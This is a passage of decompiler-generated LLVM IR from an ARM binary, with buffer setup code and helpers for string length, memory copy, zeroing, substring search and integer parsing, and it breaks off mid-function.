  %v4_ff1c = call i32 @function_10190(i32 %v1_ff08, i32 ptrtoint ([9 x i8]* @global_var_1603c.234 to i32), i32 8)
  %v0_ff20 = load i32, i32* @r7, align 4
  %v0_ff24 = load i32, i32* @r5, align 4
  store i32 %v0_ff24, i32* @global_var_20894.235, align 4
  %v0_ff28 = load i32, i32* @r6, align 4
  %v1_ff28 = trunc i32 %v0_ff28 to i16
  store i16 %v1_ff28, i16* bitcast (i32* @global_var_20898.236 to i16*), align 4
  %v1_ff2c = call i32 @function_11604(i32 %v0_ff20)
  %v0_ff34 = load i32, i32* @r7, align 4
  store i32 %v1_ff2c, i32* @r5, align 4
  %v4_ff3c = call i32 @function_10190(i32 %v1_ff2c, i32 ptrtoint ([8 x i8]* @global_var_16048.238 to i32), i32 %v0_ff34)
  %v0_ff44 = load i32, i32* @r5, align 4
  store i32 %v0_ff44, i32* @global_var_2089c.239, align 4
  %v0_ff48 = load i32, i32* @r7, align 4
  %v1_ff48 = trunc i32 %v0_ff48 to i16
  store i16 %v1_ff48, i16* bitcast (i32* @global_var_208a0.240 to i16*), align 4
  %v1_ff4c = call i32 @function_11604(i32 16)
  store i32 %v1_ff4c, i32* @r5, align 4
  %v4_ff5c = call i32 @function_10190(i32 %v1_ff4c, i32 ptrtoint ([17 x i8]* @global_var_16050.242 to i32), i32 16)
  %v0_ff64 = load i32, i32* @r6, align 4
  store i16 16, i16* bitcast (i32* @global_var_20840.243 to i16*), align 4
  %v0_ff6c = load i32, i32* @r5, align 4
  store i32 %v0_ff6c, i32* @global_var_2083c.244, align 4
  %v1_ff70 = call i32 @function_11604(i32 %v0_ff64)
  %v0_ff78 = load i32, i32* @r6, align 4
  store i32 %v1_ff70, i32* @r5, align 4
  %v4_ff80 = call i32 @function_10190(i32 %v1_ff70, i32 ptrtoint ([9 x i8]* @global_var_16064.246 to i32), i32 %v0_ff78)
  %v0_ff88 = load i32, i32* @r5, align 4
  store i32 %v0_ff88, i32* @global_var_20844.247, align 4
  %v0_ff8c = load i32, i32* @r6, align 4
  %v1_ff8c = trunc i32 %v0_ff8c to i16
  store i16 %v1_ff8c, i16* bitcast (i32* @global_var_20848.248 to i16*), align 4
  %v1_ff90 = call i32 @function_11604(i32 21)
  store i32 %v1_ff90, i32* @r5, align 4
  %v3_ffa0 = call i32 @function_10190(i32 %v1_ff90, i32 ptrtoint (i32* @global_var_1610c.250 to i32), i32 21)
  store i16 21, i16* bitcast (i32* @global_var_20850.251 to i16*), align 4
  %v0_ffb0 = load i32, i32* @r5, align 4
  store i32 %v0_ffb0, i32* @global_var_2084c.252, align 4
  %v1_ffb4 = call i32 @function_11604(i32 17)
  store i32 %v1_ffb4, i32* @r5, align 4
  %v4_ffc4 = call i32 @function_10190(i32 %v1_ffb4, i32 ptrtoint ([18 x i8]* @global_var_16070.254 to i32), i32 17)
  store i16 17, i16* bitcast (i32* @global_var_20858.255 to i16*), align 4
  %v0_ffd4 = load i32, i32* @r5, align 4
  store i32 %v0_ffd4, i32* @global_var_20854.256, align 4
  %v1_ffd8 = call i32 @function_11604(i32 12)
  store i32 %v1_ffd8, i32* @r5, align 4
  %v4_ffe8 = call i32 @function_10190(i32 %v1_ffd8, i32 ptrtoint ([13 x i8]* @global_var_16084.258 to i32), i32 12)
  %v0_fff0 = load i32, i32* @r8, align 4
  store i16 12, i16* bitcast (i32* @global_var_20860.259 to i16*), align 4
  %v0_fff8 = load i32, i32* @r5, align 4
  store i32 %v0_fff8, i32* @global_var_2085c.260, align 4
  %v1_fffc = call i32 @function_11604(i32 %v0_fff0)
  %v0_10004 = load i32, i32* @r8, align 4
  store i32 %v1_fffc, i32* @r5, align 4
  %v4_1000c = call i32 @function_10190(i32 %v1_fffc, i32 ptrtoint ([15 x i8]* @global_var_16094.262 to i32), i32 %v0_10004)
  %v0_10014 = load i32, i32* @r5, align 4
  store i32 %v0_10014, i32* @global_var_20864.263, align 4
  %v0_10018 = load i32, i32* @r8, align 4
  %v1_10018 = trunc i32 %v0_10018 to i16
  store i16 %v1_10018, i16* bitcast (i32* @global_var_20868.264 to i16*), align 4
  %v1_1001c = call i32 @function_11604(i32 19)
  store i32 %v1_1001c, i32* @r5, align 4
  %v4_1002c = call i32 @function_10190(i32 %v1_1001c, i32 ptrtoint ([20 x i8]* @global_var_160a4.266 to i32), i32 19)
  %v0_10034 = load i32, i32* @r6, align 4
  store i16 19, i16* bitcast (i32* @global_var_20870.267 to i16*), align 4
  %v0_1003c = load i32, i32* @r5, align 4
  store i32 %v0_1003c, i32* @global_var_2086c.268, align 4
  %v1_10040 = call i32 @function_11604(i32 %v0_10034)
  %v0_10048 = load i32, i32* @r6, align 4
  store i32 %v1_10040, i32* @r5, align 4
  %v4_10050 = call i32 @function_10190(i32 %v1_10040, i32 ptrtoint ([9 x i8]* @global_var_160b8.270 to i32), i32 %v0_10048)
  %v0_10054 = load i32, i32* @sb, align 4
  %v0_10058 = load i32, i32* @r5, align 4
  store i32 %v0_10058, i32* @global_var_20874.271, align 4
  %v0_1005c = load i32, i32* @r6, align 4
  %v1_1005c = trunc i32 %v0_1005c to i16
  store i16 %v1_1005c, i16* bitcast (i32* @global_var_20878.272 to i16*), align 4
  %v1_10060 = call i32 @function_11604(i32 %v0_10054)
  %v0_10068 = load i32, i32* @sb, align 4
  store i32 %v1_10060, i32* @r5, align 4
  %v4_10070 = call i32 @function_10190(i32 %v1_10060, i32 ptrtoint ([6 x i8]* @global_var_160c4.274 to i32), i32 %v0_10068)
  %v0_10074 = load i32, i32* @sl, align 4
  %v0_10078 = load i32, i32* @r5, align 4
  store i32 %v0_10078, i32* @global_var_2087c.275, align 4
  %v0_1007c = load i32, i32* @sb, align 4
  %v1_1007c = trunc i32 %v0_1007c to i16
  store i16 %v1_1007c, i16* bitcast (i32* @global_var_20880.276 to i16*), align 4
  %v1_10080 = call i32 @function_11604(i32 %v0_10074)
  %v0_10088 = load i32, i32* @sl, align 4
  store i32 %v1_10080, i32* @r5, align 4
  %v4_10090 = call i32 @function_10190(i32 %v1_10080, i32 ptrtoint ([7 x i8]* @global_var_160cc.278 to i32), i32 %v0_10088)
  %v0_10098 = load i32, i32* @r5, align 4
  store i32 %v0_10098, i32* @global_var_20884.279, align 4
  %v0_1009c = load i32, i32* @sl, align 4
  %v1_1009c = trunc i32 %v0_1009c to i16
  store i16 %v1_1009c, i16* bitcast (i32* @global_var_20888.280 to i16*), align 4
  %v1_100a0 = call i32 @function_11604(i32 23)
  %v4_100b0 = call i32 @function_10190(i32 %v1_100a0, i32 ptrtoint ([24 x i8]* @global_var_160d4.282 to i32), i32 23)
  store i32 %v1_100a0, i32* @global_var_2088c.283, align 4
  store i16 23, i16* bitcast (i32* @global_var_20890.284 to i16*), align 4
  %v2_100c0 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_100c0, i32* @r4, align 4
  store i32 %v6_fde0, i32* @r5, align 4
  store i32 %v9_fde0, i32* @r6, align 4
  store i32 %v12_fde0, i32* @r7, align 4
  store i32 %v15_fde0, i32* @r8, align 4
  store i32 %v18_fde0, i32* @sb, align 4
  store i32 %v21_fde0, i32* @sl, align 4
  ret i32 %v4_100b0

; uselistorder directives
  uselistorder i32 %v1_10080, { 1, 0 }
  uselistorder i32 %v1_10060, { 1, 0 }
  uselistorder i32 %v1_10040, { 1, 0 }
  uselistorder i32 %v1_fffc, { 1, 0 }
  uselistorder i32 %v1_ff70, { 1, 0 }
  uselistorder i32 %v1_ff2c, { 1, 0 }
  uselistorder i32 %v1_ff08, { 1, 0 }
  uselistorder i32 %v1_fe10, { 1, 0 }
  uselistorder i32 %v1_fde8, { 1, 0 }
  uselistorder i32 23, { 1, 0, 2, 3, 4 }
  uselistorder i32 21, { 1, 0, 6, 5, 2, 7, 3, 8, 4, 9 }
  uselistorder i32 29, { 1, 0, 4, 3, 2 }
  uselistorder i32 (i32, i32, i32)* @function_10190, { 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 6, 5, 4, 3, 2, 1, 0, 7 }
  uselistorder i32 ptrtoint (i32* @global_var_207ac.195 to i32), { 4, 0, 1, 2, 3, 5 }
}

define i32 @function_10120(i8* %arg1) local_unnamed_addr {
dec_label_pc_10120:
  %tmp = ptrtoint i8* %arg1 to i32
  %v3_10124 = load i8, i8* %arg1, align 1
  %v2_10128 = icmp eq i8 %v3_10124, 0
  %v0_1012c = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_10128, i32 %v0_1012c)
  br label %dec_label_pc_10134

dec_label_pc_10134:                               ; preds = %dec_label_pc_10134, %dec_label_pc_10120
  %v0_10134 = phi i32 [ %v1_10134, %dec_label_pc_10134 ], [ 0, %dec_label_pc_10120 ]
  %v1_10134 = add i32 %v0_10134, 1
  %v2_10138 = add i32 %v1_10134, %tmp
  %v3_10138 = inttoptr i32 %v2_10138 to i8*
  %v4_10138 = load i8, i8* %v3_10138, align 1
  %v2_1013c = icmp eq i8 %v4_10138, 0
  br i1 %v2_1013c, label %dec_label_pc_10144, label %dec_label_pc_10134

dec_label_pc_10144:                               ; preds = %dec_label_pc_10134
  ret i32 %v1_10134
}

define i32 @function_10148(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10148:
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v2_10148 = load i8, i8* %arg1, align 1
  %v3_10148 = zext i8 %v2_10148 to i32
  store i32 %v3_10148, i32* @r2, align 4
  %v2_1014c = icmp eq i8 %v2_10148, 0
  br i1 %v2_1014c, label %bb, label %dec_label_pc_10158

bb:                                               ; preds = %dec_label_pc_10148
  store i32 %v3_10148, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_1016c

dec_label_pc_10158:                               ; preds = %dec_label_pc_10148
  store i32 0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_1015c

dec_label_pc_1015c:                               ; preds = %dec_label_pc_1015c, %dec_label_pc_10158
  %v0_1015c = phi i32 [ %v1_1015c, %dec_label_pc_1015c ], [ 0, %dec_label_pc_10158 ]
  %v1_1015c = add i32 %v0_1015c, 1
  store i32 %v1_1015c, i32* %ip.global-to-local, align 4
  %v2_10160 = add i32 %v1_1015c, %tmp
  %v3_10160 = inttoptr i32 %v2_10160 to i8*
  %v4_10160 = load i8, i8* %v3_10160, align 1
  %v2_10164 = icmp eq i8 %v4_10160, 0
  br i1 %v2_10164, label %dec_label_pc_1016c, label %dec_label_pc_1015c

dec_label_pc_1016c:                               ; preds = %dec_label_pc_1015c, %bb
  %v0_1016c = phi i32 [ %v3_10148, %bb ], [ %v1_1015c, %dec_label_pc_1015c ]
  br label %dec_label_pc_10178

dec_label_pc_10174:                               ; preds = %dec_label_pc_10178
  %v0_10174 = load i32, i32* %r1.global-to-local, align 4
  %v1_10174 = add i32 %v0_10174, 1
  %v2_10174 = inttoptr i32 %v1_10174 to i8*
  %v3_10174 = load i8, i8* %v2_10174, align 1
  %v4_10174 = zext i8 %v3_10174 to i32
  store i32 %v4_10174, i32* @r2, align 4
  store i32 %v1_10174, i32* %r1.global-to-local, align 4
  %v0_10178.pr = load i32, i32* @r3, align 4
  br label %dec_label_pc_10178

dec_label_pc_10178:                               ; preds = %dec_label_pc_1016c, %dec_label_pc_10174
  %v0_10180.off0 = phi i8 [ %v2_10148, %dec_label_pc_1016c ], [ %v3_10174, %dec_label_pc_10174 ]
  %v0_10178 = phi i32 [ %v0_1016c, %dec_label_pc_1016c ], [ %v0_10178.pr, %dec_label_pc_10174 ]
  %v1_10178 = add i32 %v0_10178, -1
  store i32 %v1_10178, i32* @r3, align 4
  %v3_1017c = icmp eq i32 %v0_10178, 0
  %v2_10180 = load i32, i32* @r0, align 4
  %v3_10180 = inttoptr i32 %v2_10180 to i8*
  store i8 %v0_10180.off0, i8* %v3_10180, align 1
  %v4_10180 = load i32, i32* @r0, align 4
  %v5_10180 = add i32 %v4_10180, 1
  store i32 %v5_10180, i32* @r0, align 4
  br i1 %v3_1017c, label %dec_label_pc_10188, label %dec_label_pc_10174

dec_label_pc_10188:                               ; preds = %dec_label_pc_10178
  %v0_10188 = load i32, i32* %ip.global-to-local, align 4
  ret i32 %v0_10188

; uselistorder directives
  uselistorder i32 %v0_10178, { 1, 0 }
  uselistorder i32 %v1_1015c, { 0, 1, 3, 2 }
  uselistorder i32* %r1.global-to-local, { 2, 1, 0 }
  uselistorder i32* %ip.global-to-local, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_10178, { 1, 0 }
}

define i32 @function_10190(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_10190:
  %v2_10190 = icmp eq i32 %arg3, 0
  %v0_10194 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_10190, i32 %v0_10194)
  store i32 0, i32* @ip, align 4
  br label %dec_label_pc_1019c

dec_label_pc_1019c:                               ; preds = %dec_label_pc_1019c, %dec_label_pc_10190
  %v0_1019c = phi i32 [ %v1_101a4, %dec_label_pc_1019c ], [ 0, %dec_label_pc_10190 ]
  %v2_1019c = add i32 %v0_1019c, %arg2
  %v3_1019c = inttoptr i32 %v2_1019c to i8*
  %v4_1019c = load i8, i8* %v3_1019c, align 1
  %v4_101a0 = add i32 %v0_1019c, %arg1
  %v5_101a0 = inttoptr i32 %v4_101a0 to i8*
  store i8 %v4_1019c, i8* %v5_101a0, align 1
  %v0_101a4 = load i32, i32* @ip, align 4
  %v1_101a4 = add i32 %v0_101a4, 1
  store i32 %v1_101a4, i32* @ip, align 4
  %v9_101a8 = icmp eq i32 %v1_101a4, %arg3
  br i1 %v9_101a8, label %dec_label_pc_101b0, label %dec_label_pc_1019c

dec_label_pc_101b0:                               ; preds = %dec_label_pc_1019c
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %v1_101a4, { 1, 2, 0 }
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @function_101b4() local_unnamed_addr {
dec_label_pc_101b4:
  %r2.global-to-local = alloca i32, align 4
  %v0_101b4 = load i32, i32* @r1, align 4
  %v2_101b4 = icmp eq i32 %v0_101b4, 0
  %v0_101b8 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_101b4, i32 %v0_101b8)
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_101c0

dec_label_pc_101c0:                               ; preds = %dec_label_pc_101c0, %dec_label_pc_101b4
  %v2_101c4 = phi i32 [ %v1_101c8, %dec_label_pc_101c0 ], [ 0, %dec_label_pc_101b4 ]
  store i32 0, i32* @r3, align 4
  %v3_101c4 = load i32, i32* @r0, align 4
  %v4_101c4 = add i32 %v3_101c4, %v2_101c4
  %v5_101c4 = inttoptr i32 %v4_101c4 to i8*
  store i8 0, i8* %v5_101c4, align 1
  %v0_101c8 = load i32, i32* %r2.global-to-local, align 4
  %v1_101c8 = add i32 %v0_101c8, 1
  store i32 %v1_101c8, i32* %r2.global-to-local, align 4
  %v1_101cc = load i32, i32* @r1, align 4
  %v9_101cc = icmp eq i32 %v1_101c8, %v1_101cc
  br i1 %v9_101cc, label %dec_label_pc_101d4, label %dec_label_pc_101c0

dec_label_pc_101d4:                               ; preds = %dec_label_pc_101c0
  %v1_101d4 = load i32, i32* @r0, align 4
  ret i32 %v1_101d4

; uselistorder directives
  uselistorder i32 %v1_101c8, { 1, 2, 0 }
}

define i32 @function_101d8(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_101d8:
  %v7_101ec = icmp sgt i32 %arg4, %arg2
  br i1 %v7_101ec, label %dec_label_pc_101f4, label %dec_label_pc_101fc

dec_label_pc_101f4:                               ; preds = %dec_label_pc_10210, %dec_label_pc_101fc, %dec_label_pc_101d8, %dec_label_pc_1023c
  %storemerge = phi i32 [ %v1_1023c, %dec_label_pc_1023c ], [ -1, %dec_label_pc_101d8 ], [ -1, %dec_label_pc_101fc ], [ -1, %dec_label_pc_10210 ]
  ret i32 %storemerge

dec_label_pc_101fc:                               ; preds = %dec_label_pc_101d8
  %tmp12 = icmp slt i32 %arg2, 1
  br i1 %tmp12, label %dec_label_pc_101f4, label %dec_label_pc_10204

dec_label_pc_10204:                               ; preds = %dec_label_pc_101fc
  br label %dec_label_pc_1021c

dec_label_pc_10210:                               ; preds = %bb, %dec_label_pc_10230
  %v1_1021c3 = phi i32 [ %v1_10230, %dec_label_pc_10230 ], [ 0, %bb ]
  %v1_10210 = add i32 %v0_1023c, 1
  %v9_10214 = icmp eq i32 %v1_10210, %arg2
  br i1 %v9_10214, label %dec_label_pc_101f4, label %dec_label_pc_1021c

dec_label_pc_1021c:                               ; preds = %dec_label_pc_10210, %dec_label_pc_10204
  %v0_1023c = phi i32 [ %v1_10210, %dec_label_pc_10210 ], [ 0, %dec_label_pc_10204 ]
  %v1_1021c = phi i32 [ %v1_1021c3, %dec_label_pc_10210 ], [ 0, %dec_label_pc_10204 ]
  %v2_1021c = add i32 %v1_1021c, %arg3
  %v3_1021c = inttoptr i32 %v2_1021c to i8*
  %v4_1021c = load i8, i8* %v3_1021c, align 1
  %v2_10220 = add i32 %v0_1023c, %arg1
  %v3_10220 = inttoptr i32 %v2_10220 to i8*
  %v4_10220 = load i8, i8* %v3_10220, align 1
  %v9_10224 = icmp eq i8 %v4_10220, %v4_1021c
  br i1 %v9_10224, label %dec_label_pc_10230, label %bb

bb:                                               ; preds = %dec_label_pc_1021c
  store i32 0, i32* @ip, align 4
  br label %dec_label_pc_10210

dec_label_pc_10230:                               ; preds = %dec_label_pc_1021c
  %v1_10230 = add i32 %v1_1021c, 1
  store i32 %v1_10230, i32* @ip, align 4
  %v9_10234 = icmp eq i32 %v1_10230, %arg4
  br i1 %v9_10234, label %dec_label_pc_1023c, label %dec_label_pc_10210

dec_label_pc_1023c:                               ; preds = %dec_label_pc_10230
  %v1_1023c = add i32 %v0_1023c, 1
  br label %dec_label_pc_101f4

; uselistorder directives
  uselistorder i32 %v1_10230, { 1, 2, 0 }
  uselistorder i32 %v1_1021c, { 1, 0 }
  uselistorder i32 %arg2, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10210, { 1, 0 }
  uselistorder label %dec_label_pc_101f4, { 3, 0, 1, 2 }
}

define i32 @function_10244(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10244:
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %v3_10244 = load i32, i32* @r4, align 4
  %v12_10244 = load i32, i32* @r7, align 4
  store i32 %tmp, i32* %r5.global-to-local, align 4
  store i32 %arg2, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_10254

dec_label_pc_10254:                               ; preds = %.thread, %dec_label_pc_10268, %bb, %dec_label_pc_10244
  %v0_10254 = phi i32 [ %tmp, %dec_label_pc_10244 ], [ %v5_10254, %bb ], [ %v5_10254, %dec_label_pc_10268 ], [ %v5_10254, %.thread ]
  %v1_10254 = inttoptr i32 %v0_10254 to i8*
  %v2_10254 = load i8, i8* %v1_10254, align 1
  %v5_10254 = add i32 %v0_10254, 1
  store i32 %v5_10254, i32* %r5.global-to-local, align 4
  %v7_10258 = icmp eq i8 %v2_10254, 9
  br i1 %v7_10258, label %.thread, label %bb

.thread:                                          ; preds = %dec_label_pc_10254
  br label %dec_label_pc_10254

bb:                                               ; preds = %dec_label_pc_10254
  %v3_10254 = zext i8 %v2_10254 to i32
  %v8_1025c = icmp eq i8 %v2_10254, 32
  store i32 %v3_10254, i32* @r4, align 4
  br i1 %v8_1025c, label %dec_label_pc_10254, label %dec_label_pc_10268

dec_label_pc_10268:                               ; preds = %bb
  %v7_10268 = icmp eq i8 %v2_10254, 10
  br i1 %v7_10268, label %dec_label_pc_10254, label %dec_label_pc_10270

dec_label_pc_10270:                               ; preds = %dec_label_pc_10268
  %v7_10270 = icmp eq i8 %v2_10254, 45
  br i1 %v7_10270, label %dec_label_pc_10360, label %dec_label_pc_10278

dec_label_pc_10278:                               ; preds = %dec_label_pc_10270
  %v7_10278 = icmp eq i8 %v2_10254, 43
  br i1 %v7_10278, label %bb44, label %dec_label_pc_10288

bb44:                                             ; preds = %dec_label_pc_10278
  %v2_1027c = inttoptr i32 %v5_10254 to i8*
  %v3_1027c = load i8, i8* %v2_1027c, align 1
  %v4_1027c = zext i8 %v3_1027c to i32
  store i32 %v4_1027c, i32* @r4, align 4
  %v6_1027c = add i32 %v0_10254, 2
  store i32 %v6_1027c, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_10288

dec_label_pc_10288:                               ; preds = %bb44, %dec_label_pc_10278, %dec_label_pc_10360
  %storemerge1 = phi i32 [ -2147483648, %dec_label_pc_10360 ], [ 2147483647, %dec_label_pc_10278 ], [ 2147483647, %bb44 ]
  %storemerge = phi i32 [ 1, %dec_label_pc_10360 ], [ 0, %dec_label_pc_10278 ], [ 0, %bb44 ]
  store i32 %storemerge1, i32* @r7, align 4
  store i32 %storemerge, i32* %sl.global-to-local, align 4
  %v2_10290 = call i32 @function_10778(i32 %storemerge1, i32 %arg2)
  %v0_10294 = load i32, i32* @r7, align 4
  store i32 %v0_10294, i32* @r0, align 4
  store i32 %arg2, i32* %r8.global-to-local, align 4
  %v0_1029c = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_1029c, i32* @r1, align 4
  %v0_102a0 = call i32 @function_1067c()
  %v0_102b0.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_102b0.outer

dec_label_pc_102b0.outer:                         ; preds = %.thread5, %dec_label_pc_10288
  %v2_1032c.ph = phi i32 [ %v5_1032c, %.thread5 ], [ 0, %dec_label_pc_10288 ]
  %v1_102f0.ph = phi i32 [ %v4_10330, %.thread5 ], [ %v0_102b0.pre, %dec_label_pc_10288 ]
  %v1_10308.ph = phi i32 [ 1, %.thread5 ], [ 0, %dec_label_pc_10288 ]
  %v3_102fc = icmp uge i32 %v2_1032c.ph, %v0_102a0
  %v9_102fc = icmp eq i32 %v2_1032c.ph, %v0_102a0
  %v2_10300 = xor i1 %v3_102fc, true
  %v3_10300 = or i1 %v9_102fc, %v2_10300
  %v2_10304 = xor i1 %v9_102fc, true
  %v3_10304 = and i1 %v3_102fc, %v2_10304
  %v2_10324 = icmp eq i1 %v9_102fc, false
  br label %dec_label_pc_102b0

dec_label_pc_102b0:                               ; preds = %dec_label_pc_102b0.outer, %dec_label_pc_10338
  %v1_10308 = phi i32 [ -1, %dec_label_pc_10338 ], [ %v1_10308.ph, %dec_label_pc_102b0.outer ]
  %v1_102f0 = phi i32 [ %v3_10338, %dec_label_pc_10338 ], [ %v1_102f0.ph, %dec_label_pc_102b0.outer ]
  %v1_102b0 = urem i32 %v1_102f0, 256
  %v1_102b4 = add nsw i32 %v1_102b0, -48
  %v1_102bc = add nsw i32 %v1_102b0, -97
  %v1_102c0 = add i32 %v1_102f0, -48
  %v1_102c4 = add nsw i32 %v1_102b0, -65
  %tmp75 = icmp ult i32 %v1_102b4, 10
  br i1 %tmp75, label %dec_label_pc_102f4, label %dec_label_pc_102cc

dec_label_pc_102cc:                               ; preds = %dec_label_pc_102b0
  %v2_102cc = icmp ugt i32 %v1_102c4, 24
  %v7_102cc = icmp eq i32 %v1_102c4, 25
  %v2_102d0 = xor i1 %v7_102cc, true
  %v3_102d0 = and i1 %v2_102cc, %v2_102d0
  br i1 %v3_102d0, label %bb45, label %bb46

bb45:                                             ; preds = %dec_label_pc_102cc
  br label %bb46

bb46:                                             ; preds = %dec_label_pc_102cc, %bb45
  %v0_102e414 = phi i32 [ %v1_102c0, %dec_label_pc_102cc ], [ 0, %bb45 ]
  %v2_102d4 = xor i1 %v2_102cc, true
  %v3_102d4 = or i1 %v7_102cc, %v2_102d4
  br i1 %v3_102d4, label %bb47, label %bb48

bb47:                                             ; preds = %bb46
  br label %bb48

bb48:                                             ; preds = %bb46, %bb47
  %v0_102e4 = phi i32 [ %v0_102e414, %bb46 ], [ 1, %bb47 ]
  br i1 %v3_102d0, label %bb49, label %bb50

bb49:                                             ; preds = %bb48
  %v6_102dc = icmp ugt i32 %v1_102bc, 24
  %v11_102dc = icmp eq i32 %v1_102bc, 25
  br label %bb50

bb50:                                             ; preds = %bb48, %bb49
  %v1_102e0 = phi i1 [ %v7_102cc, %bb48 ], [ %v11_102dc, %bb49 ]
  %v0_102e0 = phi i1 [ %v2_102cc, %bb48 ], [ %v6_102dc, %bb49 ]
  %v2_102e0 = xor i1 %v1_102e0, true
  %v3_102e0 = and i1 %v0_102e0, %v2_102e0
  br i1 %v3_102e0, label %dec_label_pc_10344, label %dec_label_pc_102e4

dec_label_pc_102e4:                               ; preds = %bb50
  %v2_102e4 = icmp eq i32 %v0_102e4, 0
  %. = select i1 %v2_102e4, i32 87, i32 55
  %v2_102f0 = sub i32 %v1_102f0, %.
  br label %dec_label_pc_102f4

dec_label_pc_102f4:                               ; preds = %dec_label_pc_102b0, %dec_label_pc_102e4
  %v0_1030829 = phi i32 [ %v1_102c4, %dec_label_pc_102b0 ], [ %., %dec_label_pc_102e4 ]
  %v3_1032c = phi i32 [ %v1_102c0, %dec_label_pc_102b0 ], [ %v2_102f0, %dec_label_pc_102e4 ]
  %v1_102f4 = load i32, i32* %r6.global-to-local, align 4
  %v2_102f4 = sub i32 %v3_1032c, %v1_102f4
  %v4_102f4 = xor i32 %v1_102f4, %v3_1032c
  %v5_102f4 = xor i32 %v2_102f4, %v3_1032c
  %v6_102f4 = and i32 %v5_102f4, %v4_102f4
  %v7_102f4 = icmp slt i32 %v6_102f4, 0
  %v8_102f4 = icmp slt i32 %v2_102f4, 0
  %v2_102f8 = xor i1 %v8_102f4, %v7_102f4
  br i1 %v2_102f8, label %dec_label_pc_102fc, label %dec_label_pc_10344

dec_label_pc_102fc:                               ; preds = %dec_label_pc_102f4
  br i1 %v3_10300, label %bb53, label %bb54

bb53:                                             ; preds = %dec_label_pc_102fc
  br label %bb54

bb54:                                             ; preds = %dec_label_pc_102fc, %bb53
  %v0_1030828 = phi i32 [ %v0_1030829, %dec_label_pc_102fc ], [ 0, %bb53 ]
  br i1 %v3_10304, label %bb55, label %bb56

bb55:                                             ; preds = %bb54
  br label %bb56

bb56:                                             ; preds = %bb54, %bb55
  %v0_10308 = phi i32 [ %v0_1030828, %bb54 ], [ 1, %bb55 ]
  %tmp76 = icmp slt i32 %v1_10308, 0
  %v4_10308 = zext i1 %tmp76 to i32
  %v5_10308 = or i32 %v0_10308, %v4_10308
  %v7_10308 = icmp eq i32 %v5_10308, 0
  br i1 %v7_10308, label %dec_label_pc_10310, label %dec_label_pc_10338

dec_label_pc_10310:                               ; preds = %bb56
  %v1_1031c = load i32, i32* %r8.global-to-local, align 4
  %v2_1031c = sub i32 %v3_1032c, %v1_1031c
  %v4_1031c = xor i32 %v1_1031c, %v3_1032c
  %v5_1031c = xor i32 %v2_1031c, %v3_1032c
  %v6_1031c = and i32 %v5_1031c, %v4_1031c
  %v7_1031c = icmp slt i32 %v6_1031c, 0
  %v8_1031c = icmp slt i32 %v2_1031c, 0
  %v9_1031c = icmp eq i32 %v3_1032c, %v1_1031c
  %v3_10320 = xor i1 %v8_1031c, %v7_1031c
  %v4_10320 = or i1 %v9_1031c, %v3_10320
  br i1 %v4_10320, label %thread-pre-split.thread, label %thread-pre-split

thread-pre-split.thread:                          ; preds = %dec_label_pc_10310
  br label %.thread5

thread-pre-split:                                 ; preds = %dec_label_pc_10310
  br i1 %v2_10324, label %.thread5, label %dec_label_pc_10338

.thread5:                                         ; preds = %thread-pre-split, %thread-pre-split.thread
  %v4_1032c = mul i32 %v1_102f4, %v2_1032c.ph
  %v5_1032c = add i32 %v4_1032c, %v3_1032c
  %v1_10330 = load i32, i32* %r5.global-to-local, align 4
  %v2_10330 = inttoptr i32 %v1_10330 to i8*
  %v3_10330 = load i8, i8* %v2_10330, align 1
  %v4_10330 = zext i8 %v3_10330 to i32
  %v6_10330 = add i32 %v1_10330, 1
  store i32 %v6_10330, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_102b0.outer

dec_label_pc_10338:                               ; preds = %thread-pre-split, %bb56
  %v0_10338 = load i32, i32* %r5.global-to-local, align 4
  %v1_10338 = inttoptr i32 %v0_10338 to i8*
  %v2_10338 = load i8, i8* %v1_10338, align 1
  %v3_10338 = zext i8 %v2_10338 to i32
  %v5_10338 = add i32 %v0_10338, 1
  store i32 %v5_10338, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_102b0

dec_label_pc_10344:                               ; preds = %dec_label_pc_102f4, %bb50
  %v1_10344 = icmp slt i32 %v1_10308, 0
  %v0_10370 = load i32, i32* %sl.global-to-local, align 4
  %v2_10370 = icmp eq i32 %v0_10370, 0
  br i1 %v1_10344, label %dec_label_pc_10370, label %dec_label_pc_1034c

dec_label_pc_1034c:                               ; preds = %dec_label_pc_10344
  br i1 %v2_10370, label %bb60, label %bb59

bb59:                                             ; preds = %dec_label_pc_1034c
  %v2_10350 = sub i32 0, %v2_1032c.ph
  br label %bb60

bb60:                                             ; preds = %.thread32, %bb61, %dec_label_pc_1034c, %bb59
  %v1_1035c = phi i32 [ -2147483648, %bb61 ], [ %v2_1032c.ph, %dec_label_pc_1034c ], [ %v2_10350, %bb59 ], [ 2147483647, %.thread32 ]
  store i32 %v3_10244, i32* @r4, align 4
  store i32 %v12_10244, i32* @r7, align 4
  ret i32 %v1_1035c

dec_label_pc_10360:                               ; preds = %dec_label_pc_10270
